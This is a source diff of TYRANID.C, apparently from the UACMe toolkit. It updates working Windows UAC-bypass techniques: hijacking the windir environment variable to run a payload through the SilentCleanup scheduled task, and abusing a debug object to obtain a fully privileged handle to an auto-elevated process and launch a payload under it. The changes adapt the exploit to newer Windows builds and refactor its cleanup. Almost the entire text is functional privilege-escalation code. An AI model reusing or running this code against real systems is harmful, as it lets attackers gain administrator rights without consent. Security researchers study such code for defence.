@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2017 - 2020
+*  (C) COPYRIGHT AUTHORS, 2017 - 2025
 *
 *  TITLE:       TYRANID.C
 *
-*  VERSION:     3.54
+*  VERSION:     3.69
 *
-*  DATE:        24 Nov 2020
+*  DATE:        07 Jul 2025
 *
 *  James Forshaw autoelevation method(s)
 *  Fine Dinning Tool (c) CIA
@@ -28,93 +28,6 @@
 #include "global.h"
 
 /*
-* ucmxStartTask
-*
-* Purpose:
-*
-* Run target task as schtasks does.
-*
-*/
-BOOLEAN ucmxStartTask()
-{
-    HRESULT hr_init, hr = E_FAIL;
-    ITaskService* pService = NULL;
-    ITaskFolder* pRootFolder = NULL;
-    IRegisteredTask* pTask = NULL;
-    IRunningTask* pRunningTask = NULL;
-    VARIANT var;
-
-    BSTR bstrTaskFolder = NULL;
-    BSTR bstrTask = NULL;
-
-    hr_init = CoInitializeEx(NULL, COINIT_MULTITHREADED);
-
-    do {
-
-        bstrTaskFolder = SysAllocString(L"\\Microsoft\\Windows\\DiskCleanup");
-        if (bstrTaskFolder == NULL)
-            break;
-
-        bstrTask = SysAllocString(L"SilentCleanup");
-        if (bstrTask == NULL)
-            break;
-
-        hr = CoCreateInstance(&CLSID_TaskScheduler,
-            NULL,
-            CLSCTX_INPROC_SERVER,
-            &IID_ITaskService,
-            (void**)&pService);
-
-        if (FAILED(hr))
-            break;
-
-        var.vt = VT_NULL;
-
-        hr = pService->lpVtbl->Connect(pService, var, var, var, var);
-        if (FAILED(hr))
-            break;
-
-        hr = pService->lpVtbl->GetFolder(pService, bstrTaskFolder, &pRootFolder);
-        if (FAILED(hr))
-            break;
-
-        hr = pRootFolder->lpVtbl->GetTask(pRootFolder, bstrTask, &pTask);
-        if (FAILED(hr))
-            break;
-
-        hr = pTask->lpVtbl->RunEx(pTask, var, TASK_RUN_IGNORE_CONSTRAINTS, 0, NULL, &pRunningTask);
-        if (FAILED(hr))
-            break;
-
-    } while (FALSE);
-
-    if (bstrTaskFolder)
-        SysFreeString(bstrTaskFolder);
-
-    if (bstrTask)
-        SysFreeString(bstrTask);
-
-    if (pRunningTask) {
-        pRunningTask->lpVtbl->Stop(pRunningTask);
-        pRunningTask->lpVtbl->Release(pRunningTask);
-    }
-
-    if (pTask)
-        pTask->lpVtbl->Release(pTask);
-
-    if (pRootFolder)
-        pRootFolder->lpVtbl->Release(pRootFolder);
-
-    if (pService)
-        pService->lpVtbl->Release(pService);
-
-    if (SUCCEEDED(hr_init))
-        CoUninitialize();
-
-    return SUCCEEDED(hr);
-}
-
-/*
 * ucmDiskCleanupEnvironmentVariable
 *
 * Purpose:
@@ -130,30 +43,36 @@ NTSTATUS ucmDiskCleanupEnvironmentVariable(
     NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
 
     WCHAR   szEnvVariable[MAX_PATH * 2];
+    PWCHAR  psz;
+    BOOL    quoteFix;
 
     do {
 
         if (_strlen(lpszPayload) > MAX_PATH)
             return STATUS_INVALID_PARAMETER;
 
+        RtlSecureZeroMemory(szEnvVariable, sizeof(szEnvVariable));
+        quoteFix = (g_ctx->dwBuildNumber >= NT_WIN10_21H2);
+
         //
         // Add quotes.
         //
         szEnvVariable[0] = L'\"';
-        szEnvVariable[1] = 0;
+        psz = &szEnvVariable[!!quoteFix];
+
         _strncpy(&szEnvVariable[1], MAX_PATH, lpszPayload, MAX_PATH);
         _strcat(szEnvVariable, L"\"");
 
         //
         // Set our controlled env.variable with payload.
         //
-        if (!supSetEnvVariableEx(FALSE, NULL, T_WINDIR, szEnvVariable))
+        if (!supSetEnvVariableEx(FALSE, NULL, T_WINDIR, psz))
             break;
 
         //
         // Run trigger task.
         //
-        if (ucmxStartTask())
+        if (supStartScheduledTask(L"\\Microsoft\\Windows\\DiskCleanup", L"SilentCleanup"))
             MethodResult = STATUS_SUCCESS;
 
         //
@@ -516,25 +435,18 @@ NTSTATUS ucmDebugObjectMethod(
 )
 {
     //UINT retryCount = 0;
-
+    BOOL debugObjectSet = FALSE;
     NTSTATUS status = STATUS_ACCESS_DENIED;
-
-    HANDLE dbgHandle = NULL, dbgProcessHandle, dupHandle;
-
+    HANDLE dbgHandle = NULL, dbgProcessHandle = NULL, dupHandle = NULL;
     PROCESS_INFORMATION procInfo;
-
     DEBUG_EVENT dbgEvent;
-
     WCHAR szProcess[MAX_PATH * 2];
-
 
     do {
 
         //
         // Spawn initial non elevated victim process under debug.
         //
-
-
         //do { /* remove comment for attempt to spam debug object within thread pool */
 
         _strcpy(szProcess, g_ctx->szSystemDirectory);
@@ -555,11 +467,9 @@ NTSTATUS ucmDebugObjectMethod(
             break;
         }
 
-
         //
         // Capture debug object handle.
         //
-
         status = supGetProcessDebugObject(procInfo.hProcess,
             &dbgHandle);
 
@@ -567,6 +477,8 @@ NTSTATUS ucmDebugObjectMethod(
             TerminateProcess(procInfo.hProcess, 0);
             CloseHandle(procInfo.hThread);
             CloseHandle(procInfo.hProcess);
+            procInfo.hThread = NULL;
+            procInfo.hProcess = NULL;
             break;
         }
 
@@ -607,18 +519,16 @@ NTSTATUS ucmDebugObjectMethod(
         // Update thread TEB with debug object handle to receive debug events.
         //
         DbgUiSetThreadDebugObject(dbgHandle);
-        dbgProcessHandle = NULL;
+        debugObjectSet = TRUE;
 
         //
         // Debugger wait cycle.
         //
         while (1) {
-
             if (!WaitForDebugEvent(&dbgEvent, INFINITE))
                 break;
 
             switch (dbgEvent.dwDebugEventCode) {
-
                 //
                 // Capture initial debug event process handle.
                 //
@@ -631,52 +541,60 @@ NTSTATUS ucmDebugObjectMethod(
                 break;
 
             ContinueDebugEvent(dbgEvent.dwProcessId, dbgEvent.dwThreadId, DBG_CONTINUE);
-
         }
 
-        if (dbgProcessHandle == NULL)
-            break;
-
-        //
-        // Create new handle from captured with PROCESS_ALL_ACCESS.
-        //
-        dupHandle = NULL;
-        status = NtDuplicateObject(dbgProcessHandle,
-            NtCurrentProcess(),
-            NtCurrentProcess(),
-            &dupHandle,
-            PROCESS_ALL_ACCESS,
-            0,
-            0);
-
-        if (NT_SUCCESS(status)) {
+        if (dbgProcessHandle) {
             //
-            // Run new process with parent set to duplicated process handle.
+            // Create new handle from captured with PROCESS_ALL_ACCESS.
             //
-            ucmxCreateProcessFromParent(dupHandle, lpszPayload);
-            NtClose(dupHandle);
+            status = NtDuplicateObject(dbgProcessHandle,
+                NtCurrentProcess(),
+                NtCurrentProcess(),
+                &dupHandle,
+                PROCESS_ALL_ACCESS,
+                0,
+                0);
+
+            if (NT_SUCCESS(status)) {
+                //
+                // Run new process with parent set to duplicated process handle.
+                //
+                ucmxCreateProcessFromParent(dupHandle, lpszPayload);
+                NtClose(dupHandle);
+                dupHandle = NULL;
+            }
         }
 
+    } while (FALSE);
+
+    //
+    // Cleanup section.
+    //
+    if (debugObjectSet) {
 #pragma warning(push)
 #pragma warning(disable: 6387)
         DbgUiSetThreadDebugObject(NULL);
 #pragma warning(pop)
+    }
 
+    if (dbgHandle) {
         NtClose(dbgHandle);
-        dbgHandle = NULL;
+    }
 
+    if (dbgProcessHandle) {
         CloseHandle(dbgProcessHandle);
+    }
 
-        //
-        // Release victim process.
-        //
+    // Release victim process if still open
+    if (procInfo.hThread) {
         CloseHandle(procInfo.hThread);
+    }
+
+    if (procInfo.hProcess) {
         TerminateProcess(procInfo.hProcess, 0);
         CloseHandle(procInfo.hProcess);
+    }
 
-    } while (FALSE);
-
-    if (dbgHandle) NtClose(dbgHandle);
     supSetGlobalCompletionEvent();
     return status;
 }
